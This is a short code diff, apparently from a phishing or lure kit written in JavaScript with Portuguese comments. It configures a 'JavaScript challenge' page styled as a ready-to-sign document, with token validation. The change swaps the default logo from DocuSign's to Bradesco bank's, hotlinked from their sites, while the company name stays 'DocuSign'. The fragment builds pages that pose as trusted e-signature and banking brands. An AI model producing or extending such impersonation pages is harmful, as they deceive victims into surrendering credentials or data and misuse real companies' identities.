@@ -74,7 +74,7 @@ function validateToken(token, expectedCode) {
 // ─── Página de desafio JavaScript — visual de documento pronto ───────────────
 // Personalize: substitua LOGO_URL pela URL da logo da sua empresa
 // Exemplo: const LOGO_URL = "https://seusite.com.br/logo.png";
-const LOGO_URL = process.env.LOGO_URL || "https://na2.docusign.net/Signing/Images/email/Email_Logo.png";
+const LOGO_URL = process.env.LOGO_URL || "https://assets.b9.com.br/wp-content/uploads/2018/11/Bradesco-novo-logo1.jpg";
 const COMPANY_NAME = process.env.COMPANY_NAME || "DocuSign";
 
 function challengePage(shortCode, token) {
